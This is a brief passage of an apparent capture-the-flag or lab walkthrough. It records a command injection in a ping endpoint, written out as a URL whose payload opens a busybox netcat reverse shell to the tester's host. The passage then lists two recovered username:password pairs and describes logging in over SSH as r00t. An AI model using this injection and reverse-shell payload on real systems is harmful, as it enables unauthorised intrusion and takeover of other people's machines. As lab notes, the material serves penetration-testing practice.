With command injection possible, got reverse shell as `www`
```
http://10.10.83.245:8081/ping?ip=10.11.103.8;`busybox nc 10.11.103.8 4245 -e /bin/bash`
```

Found a database file containing credentials 
![[Pasted image 20240822160247.png]]
![[Pasted image 20240822160258.png]]
![[Pasted image 20240822160316.png]]

`admin:mrsheafy`
`r00t:n100906`

With r00t's credentials, SSHd as r00t

